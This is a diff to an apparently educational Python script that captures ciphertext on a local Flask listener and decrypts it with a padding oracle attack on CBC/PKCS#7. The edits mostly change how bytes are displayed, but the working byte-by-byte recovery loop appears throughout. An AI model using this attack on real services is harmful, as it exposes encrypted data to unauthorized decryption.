@@ -37,6 +37,11 @@ def capture():
 
 # --- Helper functions ---
 
+def fmt(data):
+    """Format bytes as space-separated decimal values."""
+    return " ".join(str(b) for b in data)
+
+
 def xor_bytes(a, b):
     return bytes(x ^ y for x, y in zip(a, b))
 
@@ -59,18 +64,18 @@ def ask_oracle(two_blocks):
 def padding_oracle_attack(ct_hex):
     data = bytes.fromhex(ct_hex)
     blocks = split_blocks(data)
-    num_ct_blocks = len(blocks) - 1   # first block is the IV
+    num_ct_blocks = len(blocks) - 1
 
-    print("\n" + "=" * 50)
+    print("\n" + "=" * 60)
     print("  PADDING ORACLE ATTACK")
-    print("=" * 50)
-    print(f"  Ciphertext (hex) : {ct_hex}")
-    print(f"  Total length     : {len(data)} bytes")
-    print(f"  Block size       : {BLOCK_SIZE} bytes")
-    print(f"  Blocks           : 1 IV + {num_ct_blocks} ciphertext")
-    print(f"  Padding method   : PKCS#7")
-    print(f"  Oracle URL       : {ORACLE_URL}")
-    print("=" * 50)
+    print("=" * 60)
+    print(f"  Ciphertext     : {fmt(data)}")
+    print(f"  Total length   : {len(data)} bytes")
+    print(f"  Block size     : {BLOCK_SIZE} bytes")
+    print(f"  Blocks         : 1 IV + {num_ct_blocks} ciphertext")
+    print(f"  Padding method : PKCS#7")
+    print(f"  Oracle URL     : {ORACLE_URL}")
+    print("=" * 60)
 
     query_count = 0
     all_plaintext = b""
@@ -82,14 +87,12 @@ def padding_oracle_attack(ct_hex):
         intermediate = bytearray(BLOCK_SIZE)
 
         print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
-        print(f"  Previous block (hex): {prev_block.hex()}")
-        print(f"  Target block   (hex): {target_block.hex()}")
+        print(f"  Previous block : {fmt(prev_block)}")
+        print(f"  Target block   : {fmt(target_block)}")
 
-        # recover each byte from right (position 15) to left (position 0)
         for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
-            target_padding = BLOCK_SIZE - byte_pos   # the padding value we want
+            target_padding = BLOCK_SIZE - byte_pos
 
-            # prepare the crafted block
             crafted = bytearray(BLOCK_SIZE)
             for k in range(byte_pos + 1, BLOCK_SIZE):
                 crafted[k] = intermediate[k] ^ target_padding
@@ -102,24 +105,23 @@ def padding_oracle_attack(ct_hex):
                 valid = ask_oracle(forged)
 
                 if valid:
-                    # for the last byte, confirm it is really 0x01 padding
                     if byte_pos == BLOCK_SIZE - 1:
                         check = bytearray(crafted)
                         check[byte_pos - 1] ^= 0x01
                         query_count += 1
                         if not ask_oracle(bytes(check) + target_block):
-                            continue   # false positive, keep trying
+                            continue
 
                     intermediate[byte_pos] = guess ^ target_padding
                     pt_byte = prev_block[byte_pos] ^ intermediate[byte_pos]
                     char = chr(pt_byte) if 32 <= pt_byte < 127 else "."
 
                     print(f"  Byte {BLOCK_SIZE - byte_pos:2d}/16 | "
-                          f"guess=0x{guess:02x} | "
+                          f"guess={guess} | "
                           f"oracle=VALID | "
-                          f"intermediate=0x{intermediate[byte_pos]:02x} | "
-                          f"plaintext byte=0x{pt_byte:02x} ('{char}') | "
-                          f"queries so far={query_count}")
+                          f"intermediate={intermediate[byte_pos]} | "
+                          f"plaintext_byte={pt_byte} ('{char}') | "
+                          f"queries={query_count}")
                     found = True
                     break
 
@@ -129,7 +131,7 @@ def padding_oracle_attack(ct_hex):
 
         pt_block = xor_bytes(prev_block, bytes(intermediate))
         all_plaintext += pt_block
-        print(f"  Block {blk_num} plaintext (hex): {pt_block.hex()}")
+        print(f"  Block {blk_num} recovered : {fmt(pt_block)}")
 
     elapsed = time.time() - start
 
@@ -138,7 +140,7 @@ def padding_oracle_attack(ct_hex):
     pad_byte = raw[-1]
     if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
         plaintext = raw[:-pad_byte]
-        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) are 0x{pad_byte:02x}, stripped.")
+        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) have value {pad_byte}, stripped.")
     else:
         plaintext = raw
         print(f"\nNo valid PKCS#7 padding found, returning raw bytes.")
@@ -146,34 +148,34 @@ def padding_oracle_attack(ct_hex):
     try:
         text = plaintext.decode()
     except UnicodeDecodeError:
-        text = plaintext.hex()
+        text = None
 
-    print("\n" + "=" * 50)
+    print("\n" + "=" * 60)
     print("  RESULT")
-    print("=" * 50)
-    print(f"  Decrypted text : {text}")
-    print(f"  Hex            : {plaintext.hex()}")
-    print(f"  Total queries  : {query_count}")
-    print(f"  Time           : {elapsed:.2f}s")
-    print("=" * 50 + "\n")
+    print("=" * 60)
+    print(f"  Decrypted bytes : {fmt(plaintext)}")
+    if text is not None:
+        print(f"  Decrypted text  : {text}")
+    print(f"  Total queries   : {query_count}")
+    print(f"  Time            : {elapsed:.2f}s")
+    print("=" * 60 + "\n")
 
 
 def main():
-    # start flask in background
     t = threading.Thread(
         target=lambda: app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True),
         daemon=True,
     )
     t.start()
 
-    print("=" * 50)
+    print("=" * 60)
     print("  ATTACKER — PADDING ORACLE")
-    print("=" * 50)
+    print("=" * 60)
     print(f"  Block size  : {BLOCK_SIZE} bytes")
     print(f"  Padding     : PKCS#7")
     print(f"  Oracle URL  : {ORACLE_URL}")
     print(f"  Listening   : port {LISTEN_PORT}")
-    print("=" * 50)
+    print("=" * 60)
     print("\nWaiting for ciphertext from sender...\n")
 
     while True:
@@ -181,7 +183,8 @@ def main():
         captured_event.clear()
 
         ct_hex = captured_ct["hex"]
-        print(f"Ciphertext received: {ct_hex}")
+        ct_bytes = bytes.fromhex(ct_hex)
+        print(f"Ciphertext received: {fmt(ct_bytes)}")
 
         padding_oracle_attack(ct_hex)
 
